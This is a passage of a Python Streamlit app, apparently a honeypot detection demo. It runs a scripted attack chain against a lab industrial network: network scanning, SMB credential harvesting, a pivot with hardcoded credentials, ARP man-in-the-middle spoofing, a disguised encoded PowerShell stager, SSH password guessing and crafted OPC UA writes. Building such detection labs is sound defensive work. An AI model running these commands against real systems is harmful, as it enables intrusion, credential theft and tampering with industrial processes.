                        asset_class="ews",
                        mitre_technique="T0866",
                        source_asset="level35_jump_host",
                        target_asset="ews",
                    ),
                },
            },
        ),
        (
            "100402",
            "SSH session initiated on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 7,
                    "description": "SSH session initiated on EWS endpoint.",
                    "id": "100402",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["ssh", "session", "endpoint"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "event_id": "4624",
                    "logon_type": "11",
                    "logon_process": "sshd",
                    "user": "john",
                    "computer": "EWS-WIN11",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_access_ssh",
                        attack_label="lateral_movement",
                        attack_stage="host_activity",
                        asset_class="ews",
                        mitre_technique="T0866",
                        source_asset="level35_jump_host",
                        target_asset="ews",
                    ),
                },
            },
        ),
        (
            "100403",
            "Suspicious process execution detected on EWS endpoint.",
            {
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "rule": {
                    "level": 8,
                    "description": "Suspicious process execution detected on EWS endpoint.",
                    "id": "100403",
                    "firedtimes": 1,
                    "mail": False,
                    "groups": ["process", "execution", "endpoint", "suspicious"],
                },
                "agent": {"id": "004", "name": "EWS-WIN11", "ip": "192.168.1.5"},
                "manager": {"name": "wazuh.manager"},
                "data": {
                    "image": "C:\\Windows\\System32\\cmd.exe",
                    "command_line": "cmd.exe /c whoami",
                    "user": "EWS-WIN11\\john",
                    "computer": "EWS-WIN11",
                    "event_type": "process_creation",
                    **build_demo_metadata(
                        scenario_step="step_4_ews_command_execution",
                        attack_label="execution",
                        attack_stage="host_command",
                        asset_class="ews",
                        mitre_technique="T1059",
                        source_asset="ews",
                        target_asset="ews",
                    ),
                },
            },
        ),
    ]
    
    for rule_id, desc, alert_dict in markers_data:
        try:
            wrote, target = write_synthetic_wazuh_alert(alert_dict)
            if wrote:
                msgs.append(f"[DEMO MARKER] wrote synthetic {desc} ({rule_id}) to {target}, session={session_id}.")
            else:
                msgs.append(f"[DEMO MARKER DISABLED] {target}")
        except Exception as exc:
            msgs.append(f"[DEMO MARKER ERROR] rule {rule_id} failed: {exc}")
    
    return "\n".join(msgs)


def check_remote_mitm_status(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + f"\n[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    check_ps = (
        "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
        "if ($null -eq $p) {"
        "  Write-Output 'arpspoof.exe is NOT running on EWS';"
        "  exit 1"
        "}"
        "Write-Output ('arpspoof.exe is running on EWS with PID=' + $p.Id);"
        "exit 0"
    )
    cmd = powershell_encoded_command(check_ps)
    rc, output = run_remote_capture(cmd, 20, use_pty=True)
    st.session_state.buffers[step_key] = (
        st.session_state.buffers.get(step_key, "")
        + "\n$ ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"Get-Process arpspoof\\\"\"\n\n"
        + output
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    st.session_state.mitm_running = rc == 0


def stop_mitm(step_idx: int) -> None:
    step_key = f"step_{step_idx}"
    ok, msg = ssh_credentials_ready()
    if not ok:
        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + f"\n[INPUT ERROR] {msg}\n"
        st.session_state.last_exit[step_key] = -1
        return
    cmd = 'cmd /c "taskkill /F /IM arpspoof.exe"'
    rc, output = run_remote_capture(cmd, 30)
    st.session_state.buffers[step_key] = (
        st.session_state.buffers.get(step_key, "")
        + "\n$ ssh john@192.168.1.5 \"taskkill /F /IM arpspoof.exe\"\n\n"
        + output
        + f"\n\n[exit code: {rc}]\n"
    )
    st.session_state.last_exit[step_key] = rc
    if rc in (0, 128):
        st.session_state.mitm_running = False


def capture_arp_before() -> None:
    ok, msg = historian_ssh_credentials_ready()
    if not ok:
        st.session_state.arp_before = f"[INPUT ERROR] {msg}"
        return
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    cmd = (
        "hostname && ip -br addr && "
        "echo '--- ip neigh ---' && ip neigh && "
        "if command -v arp >/dev/null 2>&1; then echo '--- arp -n ---' && arp -n; else echo '--- arp -n ---' && echo 'arp command not installed'; fi"
    )
    rc, out = run_remote_capture_with_credentials(host, user, password, cmd, timeout=20)
    st.session_state.arp_before = f"[historian ssh: {user}@{host}]\n{out}\n\n[exit code: {rc}]"


def capture_arp_after() -> None:
    ok, msg = historian_ssh_credentials_ready()
    if not ok:
        st.session_state.arp_after = f"[INPUT ERROR] {msg}"
        return
    host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    user = st.session_state.get("historian_ssh_user", "").strip()
    password = st.session_state.get("historian_ssh_password", "")
    cmd = (
        "hostname && ip -br addr && "
        "echo '--- ip neigh ---' && ip neigh && "
        "if command -v arp >/dev/null 2>&1; then echo '--- arp -n ---' && arp -n; else echo '--- arp -n ---' && echo 'arp command not installed'; fi"
    )
    rc, out = run_remote_capture_with_credentials(host, user, password, cmd, timeout=20)
    st.session_state.arp_after = f"[historian ssh: {user}@{host}]\n{out}\n\n[exit code: {rc}]"


def run_evidence_bundle(step_idx: int) -> None:
    zeek_cmd = 'grep -E "\"(445|5000|4840)\"|100304A|100307A|discovery_scan" /home/ceo/zeek_feed.log | tail -30 || true'
    wazuh_cmd = (
        "docker exec single-node-wazuh.manager-1 sh -c "
        "'tail -n 2000 /var/ossec/logs/alerts/alerts.json | "
        "grep -E \"100301|100302|100303|100304|100305|100306|100307|100401|100402|100403|100404|100405|100406|100209\"' || true"
    )
    zeek_out = run_local(zeek_cmd, timeout=10)
    wazuh_out = run_local(wazuh_cmd, timeout=20)
    st.session_state.evidence_out[step_idx] = (
        "[Zeek evidence]\n"
        + zeek_out
        + "\n\n[Wazuh evidence]\n"
        + wazuh_out
    )


def run_variant_evidence_bundle(variant_key: str) -> None:
    zeek_cmd = (
        "tail -n 60 /home/ceo/zeek_feed.log 2>/dev/null"
    )
    wazuh_cmd = (
        "docker exec single-node-wazuh.manager-1 sh -c "
        "'tail -n 2500 /var/ossec/logs/alerts/alerts.json | "
        "grep -E \"100301|100302|100303|100304|100305|100306|100307|100401|100402|100403|100404|100405|100406|100209|18[0-9]{3}|92[0-9]{3}|60[0-9]{3}\"' || true"
    )
    loki_cmd = (
        "for rid in 100301 100302 100303 100304 100305 100306 100307 100402 100404 100405 100406 100209; do "
        "echo \"RULE=$rid\"; "
        "curl -sG http://localhost:3100/loki/api/v1/query_range "
        "--data-urlencode \"query={job=\\\"wazuh\\\",rule_id=\\\"$rid\\\"}\" "
        "--data-urlencode \"start=$(date -u -d '15 minutes ago' +%s%N)\" "
        "--data-urlencode \"end=$(date -u +%s%N)\" "
        "--data-urlencode 'limit=1'; echo; "
        "done"
    )
    zeek_out = run_local(zeek_cmd, timeout=15)
    wazuh_out = run_local(wazuh_cmd, timeout=20)
    loki_out = run_local(loki_cmd, timeout=30)
    st.session_state.evidence_out[variant_key] = (
        "[Zeek evidence]\n"
        + zeek_out
        + "\n\n[Wazuh evidence]\n"
        + wazuh_out
        + "\n\n[Loki evidence]\n"
        + loki_out
    )


def collect_mitm_evidence() -> str:
    t1 = st.session_state.get("arpspoof_target_1", ARPSPOOF_TARGET_1).strip() or ARPSPOOF_TARGET_1
    t2 = st.session_state.get("arpspoof_target_2", ARPSPOOF_TARGET_2).strip() or ARPSPOOF_TARGET_2
    arp_out = run_local(
        f"if command -v arp >/dev/null 2>&1; then arp -n | grep -E '{t1}|{t2}' || true; else echo 'arp command not installed'; fi",
        timeout=8,
    )
    neigh_out = run_local(f"ip neigh | grep -E '{t1}|{t2}' || true", timeout=8)
    remote_out = "(remote check skipped: missing SSH credentials)"
    if ssh_credentials_ready()[0]:
        check_ps = (
            "$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1;"
            "if ($null -eq $p) {"
            "  Write-Output 'ARPSPOOF_NOT_RUNNING';"
            "  return"
            "}"
            "Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id);"
        )
        _, out_remote = run_remote_capture(powershell_encoded_command(check_ps), 20, use_pty=True)
        if "ARPSPOOF_RUNNING" in out_remote:
            remote_out = out_remote.replace("ARPSPOOF_RUNNING", "arpspoof.exe is running on EWS with") + "\n[exit code: 0]"
        else:
            remote_out = out_remote.replace("ARPSPOOF_NOT_RUNNING", "arpspoof.exe is NOT running on EWS") + "\n[exit code: 1]"

    hist_host = st.session_state.get("historian_host", HISTORIAN_HOST).strip() or HISTORIAN_HOST
    hist_user = st.session_state.get("historian_ssh_user", "").strip()
    hist_password = st.session_state.get("historian_ssh_password", "")
    peer = t2 if t1 == hist_host else t1
    if hist_user and hist_password:
        victim_cmd = (
            "hostname && "
            + f"echo 'peer={peer}' && "
            + f"echo '--- ip neigh peer ---' && ip neigh show {peer} 2>/dev/null || true; "
            + "if command -v arp >/dev/null 2>&1; then "
            + f"echo '--- arp -n peer ---' && arp -n | grep -E '^{peer}[[:space:]]' || true; "
            + "else echo '--- arp -n peer ---' && echo 'arp command not installed'; fi"
        )
        rc_hist, out_hist = run_remote_capture_with_credentials(hist_host, hist_user, hist_password, victim_cmd, timeout=20)
        victim_out = f"{hist_host} -> {peer} [exit {rc_hist}]\n{out_hist}"
    else:
        victim_out = f"{hist_host} -> {peer}: skipped (missing historian SSH credentials)"

    return (
        "[Remote EWS arpspoof status]\n"
        + remote_out
        + "\n\n[Historian victim ARP check over SSH]\n"
        + victim_out
        + "\n\n[arp -n focused]\n"
        + arp_out
        + "\n\n[ip neigh focused]\n"
        + neigh_out
        + "\n\n[Note]\n"
        + "SOC detections can lag by 10-60 seconds depending on ingestion timing."
    )


def launch_rdp() -> str:
    host = st.session_state.ews_host
    user = st.session_state.ews_user
    password = st.session_state.ews_password
    cmd = f"xfreerdp /v:{host} /u:{user} /p:'{password}' /cert:ignore /dynamic-resolution"
    try:
        check = subprocess.run(["bash", "-lc", "command -v xfreerdp"], capture_output=True, text=True, timeout=5)
        if check.returncode != 0:
            return "RDP launch failed: xfreerdp is not installed on this machine."
        subprocess.Popen(["bash", "-lc", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "RDP launch command sent."
    except Exception as exc:
        return f"RDP launch failed: {exc}"


def run_diagnostics() -> str:
    host = st.session_state.ews_host
    user = st.session_state.ews_user
    password = st.session_state.ews_password
    lines: List[str] = []
    lines.append(f"Target EWS: {host}")
    lines.append(f"SSH user: {user}")
    lines.append(f"Ping: {'OK' if check_tcp(host, 22) or check_tcp(host, 3389) else 'UNREACHABLE'}")
    lines.append(f"SSH 22: {'OPEN' if check_tcp(host, 22) else 'CLOSED'}")
    lines.append(f"RDP 3389: {'OPEN' if check_tcp(host, 3389) else 'CLOSED'}")
    try:
        c = open_ssh(host, user, password)
        _, so, _ = c.exec_command("hostname", get_pty=True, timeout=10)
        lines.append(f"SSH auth: OK (hostname: {so.read().decode(errors='replace').strip()})")
        c.close()
    except Exception as exc:
        lines.append(f"SSH auth: FAILED ({exc})")
    return "\n".join(lines)


def collect_network_arp_snapshot() -> str:
    # Populate ARP cache with a quick ping sweep, then show the full neighbor view.
    sweep_cmd = "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 & done; wait"
    _ = run_local(sweep_cmd, timeout=40)
    arp_out = run_local("arp -n", timeout=8)
    neigh_out = run_local("ip neigh", timeout=8)
    return "[arp -n]\n" + arp_out + "\n\n[ip neigh]\n" + neigh_out


def get_ews_mac() -> str:
    host = st.session_state.ews_host
    out = run_local(f"arp -n | grep {host} || true", timeout=8)
    if out.strip() and out.strip() != "(no output)":
        return out
    # Try to refresh ARP entry by pinging target once.
    _ = run_local(f"ping -c 1 {host} >/dev/null 2>&1 || true", timeout=6)
    return run_local(f"arp -n | grep {host} || true", timeout=8)


def step_definitions(level3_subnet: str, smb_target: str, historian_host: str, opcua_endpoint: str) -> List[AttackStep]:
    ews_host = st.session_state.ews_host
    ews_user = st.session_state.ews_user
    level35_jump_host = st.session_state.level35_jump_host
    arpspoof_path = st.session_state.arpspoof_path.strip() or ARPSPOOF_PATH
    arpspoof_iface = st.session_state.arpspoof_iface.strip() or ARPSPOOF_IFACE
    arpspoof_target_1 = st.session_state.arpspoof_target_1.strip() or ARPSPOOF_TARGET_1
    arpspoof_target_2 = st.session_state.arpspoof_target_2.strip() or ARPSPOOF_TARGET_2
    manipulate_script = st.session_state.manipulate_script.strip() or MANIPULATE_SCRIPT
    ews_password_escaped = st.session_state.ews_password.replace("'", "'\"'\"'")
    nmap_base = (
        "nmap --open -T4 --max-retries 1 --host-timeout 12s "
        "-p 22,80,139,443,445,3389,4840,5000,3000 192.168.1.0/24"
    )
    nmap_timeout = 240
    nmap_exec = nmap_base
    python_exec = (
        'cmd /c "where py >nul 2>&1 && (py -3.11 \"{script}\") '
        '|| (where python >nul 2>&1 && (python \"{script}\") '
        '|| (if exist \"C:\\Python311\\python.exe\" (\"C:\\Python311\\python.exe\" \"{script}\") '
        'else (echo Python 3.11 not found on EWS. Install Python or update path.& exit /b 1)))"'
    )
    endpoint_clean = opcua_endpoint.replace("opc.tcp://", "").split("/")[0]
    if ":" in endpoint_clean:
        opc_host, opc_port_str = endpoint_clean.rsplit(":", 1)
    else:
        opc_host, opc_port_str = endpoint_clean, "4840"
    try:
        opc_port = int(opc_port_str)
    except ValueError:
        opc_host, opc_port = "192.168.1.11", 4840

    opc_probe_display = build_opc_probe_display(opc_host, opc_port)
    opc_probe_exec = build_opc_probe_exec(opc_host, opc_port)
    smb_user = st.session_state.smb_user.strip()
    smb_password = st.session_state.smb_password
    if smb_user:
        smb_mount = (
            f'net use Z: \\\\{smb_target}\\Operations "{smb_password}" '
            f'/user:"{smb_user}" /persistent:no'
        )
        smb_display = (
            f"net use Z: /delete /y\n"
            f"net use Z: \\\\{smb_target}\\Operations <password> /user:{smb_user} /persistent:no\n"
            f"dir Z:\\\n"
            f"type Z:\\shift_notes.txt\n"
            f"type Z:\\ews_maintenance_access.txt"
        )
    else:
        smb_mount = f"net use Z: \\\\{smb_target}\\Operations /persistent:no"
        smb_display = (
            f"net use Z: /delete /y\n"
            f"net use Z: \\\\{smb_target}\\Operations /persistent:no\n"
            f"dir Z:\\\n"
            f"type Z:\\shift_notes.txt\n"
            f"type Z:\\ews_maintenance_access.txt"
        )

    smb_exec = (
        f'cmd /c "net use Z: /delete /y >nul 2>&1 & {smb_mount} '
        f'& if errorlevel 1 (echo SMB mount failed & exit /b 1) '
        f'& dir Z:\\ & type Z:\\shift_notes.txt & type Z:\\ews_maintenance_access.txt"'
    )

    smb_story_local = (
        "if command -v smbclient >/dev/null 2>&1; then "
        + (
            f"smbclient //{smb_target}/Operations -U '{smb_user}%{smb_password}' -m SMB3 "
            if smb_user
            else f"smbclient //{smb_target}/Operations -N -m SMB3 "
        )
        + "-c \"ls; get shift_notes.txt /tmp/shift_notes_demo.txt; get ews_maintenance_access.txt /tmp/ews_maintenance_access_demo.txt\" "
        + "&& echo '--- shift_notes.txt ---' && sed -n '1,120p' /tmp/shift_notes_demo.txt "
        + "&& echo '--- ews_maintenance_access.txt ---' && sed -n '1,120p' /tmp/ews_maintenance_access_demo.txt; "
        + "else echo 'smbclient not installed on attacker host'; exit 1; fi"
    )

    manipulate_display = build_manipulation_display(opcua_endpoint, manipulate_script)
    manipulate_exec = build_manipulation_exec(opcua_endpoint, manipulate_script)

    return [
        AttackStep(
            1,
            "Initial foothold (Level 3.5)",
            "T0866",
            "Establish operator shell access and validate foothold context.",
            f"ssh analyst@{level35_jump_host}\nhostname && whoami",
            "hostname && whoami",
            "hostname && whoami",
            "local",
            90,
        ),
        AttackStep(
            2,
            "Discovery of Level 3 services",
            "T0846",
            "Service discovery from attacker host.",
            nmap_base,
            nmap_base,
            nmap_exec,
            "local",
            nmap_timeout,
        ),
        AttackStep(
            3,
            "Anonymous SMB browse + credential discovery",
            "T0811",
            "Browse anonymous Operations share and read credential-adjacent notes.",
            (
                f"smbclient -L //{smb_target} -N\n"
                f"smbclient //{smb_target}/Operations -N -c \"ls\"\n"
                f"smbclient //{smb_target}/Operations -N -c \"get shift_notes.txt /tmp/shift_notes.txt\" && cat /tmp/shift_notes.txt\n"
                f"smbclient //{smb_target}/Operations -N -c \"get ews_maintenance_access.txt /tmp/ews_access.txt\" && cat /tmp/ews_access.txt"
            ),
            smb_display,
            (
                f"smbclient -L //{smb_target} -N "
                f"&& smbclient //{smb_target}/Operations -N -c \"ls\" "
                f"&& smbclient //{smb_target}/Operations -N -c \"get shift_notes.txt /tmp/shift_notes.txt\" "
                f"&& cat /tmp/shift_notes.txt "
                f"&& smbclient //{smb_target}/Operations -N -c \"get ews_maintenance_access.txt /tmp/ews_access.txt\" "
                f"&& cat /tmp/ews_access.txt"
            ),
            "local",
            180,
        ),
        AttackStep(
            4,
            "Use discovered creds to access EWS",
            "T0866",
            "Pivot to EWS with discovered john/Cisco credentials (SSH or RDP).",
            (
                f"xfreerdp /v:{ews_host} /d:. /u:{ews_user} /p:'{st.session_state.ews_password}' /cert:ignore /dynamic-resolution"
                if st.session_state.ews_access_method == "RDP"
                else f"ssh {ews_user}@{ews_host}"
            )
            + "\nhostname && whoami",
            "hostname && whoami",
            (
                f"command -v xfreerdp >/dev/null 2>&1 "
                f"&& (xfreerdp /v:{ews_host} /d:. /u:{ews_user} /p:'{ews_password_escaped}' /cert:ignore /dynamic-resolution >/tmp/step4_rdp.log 2>&1 & "
                f"echo 'RDP launch command sent.') "
                f"|| (echo 'xfreerdp is not installed on this host.'; exit 1)"
                if st.session_state.ews_access_method == "RDP"
                else 'cmd /c "hostname && whoami"'
            ),
            ("local" if st.session_state.ews_access_method == "RDP" else "ews"),
            90,
        ),
        AttackStep(
            5,
            "Historian access from EWS",
            "T0802",
            "Collect historian tag history from EWS context.",
            (
                f"ssh {ews_user}@{ews_host} \"curl -c cookies.txt -X POST -d username=john -d password=Cisco http://{historian_host}:5000/login\"\n"
                f"ssh {ews_user}@{ews_host} \"curl -b cookies.txt http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c\""
            ),
            (
                f"curl -c cookies.txt -X POST -d username=john -d password=Cisco http://{historian_host}:5000/login\n"
                f"curl -b cookies.txt http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c"
            ),
            (
                f'cmd /c "curl -s -c C:\\Users\\john\\Downloads\\hist.cookies '
                f'-X POST -d username=john -d password=Cisco http://{historian_host}:5000/login >nul '
                f'&& curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
                f'http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c"'
            ),
            "ews",
            120,
        ),
        AttackStep(
            6,
            "OPC UA probe from EWS",
            "T0861",
            "Use network probe from EWS because browse_opcua.py is not present.",
            f"ssh {ews_user}@{ews_host} \"{opc_probe_display}\"",
            opc_probe_display,
            opc_probe_exec,
            "ews",
            90,
        ),
        AttackStep(
            7,
            "ARP MITM",
            "T0830",
            "Run arpspoof on EWS via SSH (same ethernet segment as historian/OPC UA), then verify ARP table.",
            f'ssh {ews_user}@{ews_host} "{arpspoof_path} --list"\n'
            f'ssh {ews_user}@{ews_host} "{build_arpspoof_display(arpspoof_path, arpspoof_iface, arpspoof_target_1, arpspoof_target_2)[7:-1]}"',
            "arp -n | grep 192.168.1.11",
            "(started by Run Step 7 controls on EWS via SSH)",
            "ews",
            45,
        ),
        AttackStep(
            8,
            "Tag manipulation",
            "T0831",
            "Stage a disguised telemetry sync tool under a Microsoft-looking AppData path on EWS, execute it, and inspect the payload template for demo explanation.",
            f"ssh {ews_user}@{ews_host} \"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand <stager>\"",
            manipulate_display,
            manipulate_exec,
            "ews",
            240,
        ),
    ]


def variant_definitions(smb_target: str, historian_host: str, opcua_endpoint: str) -> List[AttackVariant]:
    ews_host = st.session_state.ews_host.strip() or EWS_HOST
    ews_user = st.session_state.ews_user.strip() or EWS_USER
    ews_password = st.session_state.ews_password
    endpoint_clean = opcua_endpoint.replace("opc.tcp://", "").split("/")[0]
    if ":" in endpoint_clean:
        opc_host, opc_port_str = endpoint_clean.rsplit(":", 1)
    else:
        opc_host, opc_port_str = endpoint_clean, "4840"
    try:
        opc_port = int(opc_port_str)
    except ValueError:
        opc_host, opc_port = "192.168.1.11", 4840

    failed_then_success = (
        "for i in 1 2 3; do "
        f"sshpass -p 'WrongPassword!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 {ews_user}@{ews_host} hostname >/tmp/failed_ssh_$i.txt 2>&1 || true; "
        "done; "
        f"sshpass -p '{ews_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 {ews_user}@{ews_host} "
        "\"hostname && whoami\""
    )
    smb_collection = (
        f"smbclient //{smb_target}/Operations -N -m SMB3 "
        "-c \"ls; allinfo shift_notes.txt; allinfo ews_maintenance_access.txt; "
        "get shift_notes.txt /tmp/variant_shift_notes.txt; "
        "get ews_maintenance_access.txt /tmp/variant_ews_access.txt\" "
        "&& echo '--- shift_notes.txt ---' && sed -n '1,80p' /tmp/variant_shift_notes.txt "
        "&& echo '--- ews_maintenance_access.txt ---' && sed -n '1,80p' /tmp/variant_ews_access.txt"
    )
    historian_collection = (
        f'cmd /c "curl -s -c C:\\Users\\john\\Downloads\\hist.cookies '
        f'-X POST -d username=john -d password=Cisco http://{historian_host}:5000/login >nul '
        f'&& curl -s http://{historian_host}:5000/tags '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=air_pressure_bar '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=line1_vibration_mm_s"'
    )
    critical_opcua = (
        "python3 -c \"import socket; "
        f"payload = b'MSGF' + b'\\x01\\xa1\\x02' + b'air_pressure_bar' + b'VARIANT_CRITICAL'; "
        f"s = socket.create_connection(('{opc_host}', {opc_port}), timeout=5); "
        "s.sendall(payload); s.close(); print('critical opcua write-like probe sent')\""
    )
    powershell_recon = (
        'powershell -NoProfile -Command "'
        "Write-Output RECON-SESSION-START; "
        "whoami; "
        "hostname; "
        "Get-ChildItem Env: | Select-Object -First 8 Name,Value; "
        "Get-Process | Select-Object -First 8 Name,Id; "
        "Get-NetIPAddress | Select-Object -First 6 IPAddress,InterfaceAlias"
        '"'
    )

    return [
        AttackVariant(
            "failed_ssh_then_success",
            "Failed SSH guessing then success",
            "T1110 / T0866",
            "Generate noisy failed SSH auth attempts against EWS, then confirm a real pivot with the valid credential.",
            failed_then_success,
            failed_then_success,
            "local",
            120,
            ("100402",),
        ),
        AttackVariant(
            "powershell_recon",
            "PowerShell recon on EWS",
            "T1059 / T1082 / T1083",
            "Run a reconnaissance-flavored PowerShell block on EWS so host command and script-block detections light up.",
            powershell_recon,
            powershell_recon,
            "ews",
            120,
            ("100402", "100404", "100405"),
        ),
        AttackVariant(
            "smb_deep_collection",
            "Deeper SMB collection session",
            "T0811",
            "Browse Operations, inspect file metadata, and pull multiple files like a more realistic collection phase.",
            smb_collection,
            smb_collection,
            "local",
            180,
            ("100302",),
        ),
        AttackVariant(
            "historian_heavy_collection",
            "Historian-heavy collection session",
            "T0802",
            "Log in to the historian from EWS context and pull multiple process tags to model an analyst-style data collection session.",
            historian_collection,
            historian_collection,
            "ews",
            180,
            ("100301", "100402"),
        ),
        AttackVariant(
            "critical_opcua_write",
            "Critical OPC UA write-like session",
            "T0831",
            "Send a high-confidence write-like OPC UA payload toward a sensitive tag so the OT impact path triggers clearly.",
            critical_opcua,
            critical_opcua,
            "local",
            90,
            ("100303", "100304", "100305"),
        ),
    ]


def render_output(step_key: str) -> None:
    output = st.session_state.buffers.get(step_key, "")
    st.code(output or "(no output yet)", language="powershell")


def main() -> None:
    st.set_page_config(page_title="ICS Honeypot Attack Demo", layout="wide")
    init_state()

    st.title("ICS Honeypot Attack Demo Console")

    with st.sidebar:
        st.header("Demo Controls")
        st.text_input("Demo session ID", key="demo_session_id")
        if st.button("New demo session ID", use_container_width=True):
            st.session_state.demo_session_id = new_demo_session_id()
            st.rerun()
        st.checkbox("Inject synthetic fallback markers", key="inject_demo_markers")
        st.caption("Session-filtered Grafana views require session-tagged marker events. Keep this enabled for session mode.")
        st.selectbox("EWS access method", ["SSH", "RDP"], index=0, key="ews_access_method")
        st.text_input("EWS host", key="ews_host")
        st.text_input("Loki URL", value=LOKI_URL, key="loki_url")
        st.text_input("Grafana URL", value=GRAFANA_URL, key="grafana_url")
        st.text_input("Wazuh URL", value=WAZUH_URL, key="wazuh_url")
        st.text_input("Historian URL", value=HISTORIAN_URL, key="historian_url")
        st.selectbox("Evidence window", ["15m", "1h", "6h", "24h", "7d"], index=0, key="lookback")

        st.markdown("---")
        st.write("Attack Targets")
        st.text_input("Level 3.5 jump host", key="level35_jump_host")
        st.text_input("Level 3 subnet", value=LEVEL3_SUBNET, key="level3_subnet")
        st.text_input("SMB target", value=SMB_TARGET, key="smb_target")
        st.text_input("Historian host", value=HISTORIAN_HOST, key="historian_host")
        st.text_input("OPC UA endpoint", value=OPCUA_ENDPOINT, key="opcua_endpoint")
        st.text_input("Historian SSH user", key="historian_ssh_user")
        st.text_input("Historian SSH password", key="historian_ssh_password", type="password")

        st.markdown("---")
        st.write("Quick links")
        st.markdown(f"- [Grafana]({st.session_state.grafana_url})")
        sid_enc = urllib.parse.quote_plus(get_demo_session_id())
        st.markdown(f"- [Grafana (this session)]({st.session_state.grafana_url}&var-session_id={sid_enc})")
        st.markdown(f"- [Wazuh]({st.session_state.wazuh_url})")
        st.markdown(f"- [Historian]({st.session_state.historian_url})")

    col_a, col_b = st.columns([1.3, 1])

    with col_a:
        st.subheader("1) Environment and Pipeline")
        h = fetch_pipeline_health()
        hc1, hc2, hc3, hc4 = st.columns(4)
        hc1.metric("Zeek", h["Zeek"])
        hc2.metric("Wazuh", h["Wazuh"])
        hc3.metric("Loki", h["Loki"])
        if hc4.button("Refresh health", use_container_width=True):
            st.rerun()

        eh = fetch_ews_health(st.session_state.ews_host)
        ec1, ec2 = st.columns(2)
        ec1.metric("EWS SSH (22)", eh["EWS SSH"])
        ec2.metric("EWS RDP (3389)", eh["EWS RDP"])

        st.info(
            "Threat model chain: initial access via Level 3.5 jump path -> discovery -> SMB collection -> movement to EWS -> historian/OPC UA access -> ARP MITM -> telemetry integrity manipulation."
        )
        st.warning(
            "Credential acquisition story for demo: attacker lands on Level 3.5 path, browses anonymous SMB Operations share, discovers john/Cisco in maintenance note, then pivots to EWS over SSH/RDP before historian/OPC UA and MITM stages."
        )

        st.subheader("1.5) Custom Command Runner")
        cc1, cc2, cc3 = st.columns([1, 1, 1])
        cc1.selectbox(
            "Run on",
            ["ews", "local"],
            key="custom_exec_mode",
            format_func=lambda value: "EWS over SSH" if value == "ews" else "Local attacker shell",
        )
        cc2.number_input("Timeout (s)", min_value=5, max_value=600, step=5, key="custom_timeout")
        cc3.checkbox("Request PTY", key="custom_use_pty")
        st.text_area(
            "Editable custom command",
            key="custom_command_input",
            height=100,
            help="Run an ad hoc command on the EWS over SSH or in the local attacker shell.",
        )
        cb1, cb2 = st.columns(2)
        if cb1.button("Run custom command", use_container_width=True):
            run_custom_command()
        if cb2.button("Clear custom output", use_container_width=True):
            st.session_state.buffers.pop("custom_runner", None)
            st.session_state.last_exit.pop("custom_runner", None)
        if "custom_runner" in st.session_state.buffers:
            custom_rc = st.session_state.last_exit.get("custom_runner")
            if custom_rc == 0:
                st.success(f"Custom command exit code: {custom_rc}")
            elif custom_rc is not None:
                st.error(f"Custom command exit code: {custom_rc}")
            render_output("custom_runner")

        st.subheader("2) Attacker Storyline Actions")
        steps = step_definitions(
            st.session_state.level3_subnet,
            st.session_state.smb_target,
            st.session_state.historian_host,
            st.session_state.opcua_endpoint,
        )

        for step in steps:
            step_key = f"step_{step.idx}"
            running = st.session_state.running.get(step_key, False)
            with st.expander(f"Step {step.idx}: {step.title} ({step.mitre})", expanded=(step.idx == 1)):
                st.info(step.description)
                st.markdown("Attacker entry path")
                if step.title == "Use discovered creds to access EWS" and st.session_state.ews_access_method == "RDP":
                    st.code(
                        f"xfreerdp /v:{st.session_state.ews_host} /d:. /u:{st.session_state.ews_user} /p:'<password>' /cert:ignore /dynamic-resolution",
                        language="bash",
                    )
                elif step.exec_mode == "local":
                    st.code("local attacker shell (jump-path context)", language="bash")
                elif st.session_state.ews_access_method == "SSH":
                    st.code(f"ssh {st.session_state.ews_user}@{st.session_state.ews_host}", language="bash")
                else:
                    st.code(
                        f"xfreerdp /v:{st.session_state.ews_host} /u:{st.session_state.ews_user} /p:'<password>' /cert:ignore",
                        language="bash",
                    )

                st.markdown("Command preview")
                st.code(step.ssh_display, language="bash")

                step_command_key = f"step_command_{step.idx}"
                if step_command_key not in st.session_state:
                    st.session_state[step_command_key] = step.command_exec
                st.text_area(
